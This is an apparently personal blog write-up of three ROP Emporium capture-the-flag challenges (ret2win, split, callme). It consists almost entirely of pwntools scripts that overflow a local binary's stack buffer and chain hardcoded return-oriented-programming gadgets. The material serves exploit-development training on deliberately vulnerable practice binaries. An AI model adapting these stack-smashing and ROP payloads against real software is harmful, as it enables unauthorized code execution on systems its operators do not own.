---
layout: post
title:  "ROP-Emporium Writeup"
date:   2021-03-28 11:59:00 +0900
categories: CTF
---

## ret2win
EXP:
```
from pwn import *

sh = process("./ret2win")

x = b'1'*40 + p64(0x400756)

sh.sendline(x)
sh.interactive()
```

## split
EXP:
```
from pwn import *

sh = process('./split')
payload = b'1'*40 + p64(0x4007c3) + p64(0x601060) + p64(0x40074b)
sh.sendline(payload)
sh.interactive()
```

## callme
EXP:
```
from pwn import *

sh = process("./callme")

'''
'1' * 0x20 buffer 
'1' * 0x08 rbp
pop rdi,ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme_one
pop rdi, ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme two
pop rdi,ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme three
'''

pop_rdi = 0x4009a3
pop_rsi = 0x40093d
p1 = 0xdeadbeefdeadbeef
p2 = 0xcafebabecafebabe
p3 = 0xd00df00dd00df00d
call_one = 0x400720
call_two = 0x400740
call_three = 0x4006f0

payload = b'1' * 0x28
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_one)
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_two)
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_three)

#raw_input()
sh.send(payload)
sh.interactive()
```